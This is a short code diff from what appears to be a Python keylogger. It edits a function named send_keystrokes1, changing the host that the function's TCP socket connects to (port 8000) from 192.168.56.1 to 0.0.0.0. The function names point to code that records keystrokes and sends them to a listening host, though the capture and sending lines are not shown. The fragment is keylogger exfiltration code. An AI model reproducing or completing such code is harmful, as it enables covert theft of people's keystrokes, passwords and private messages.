@@ -115,7 +115,7 @@ def write_file(keys):
         
 
 def send_keystrokes1(file_name):
-    HOST = '192.168.56.1'
+    HOST = '0.0.0.0'
     PORT = 8000
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.connect((HOST, PORT))
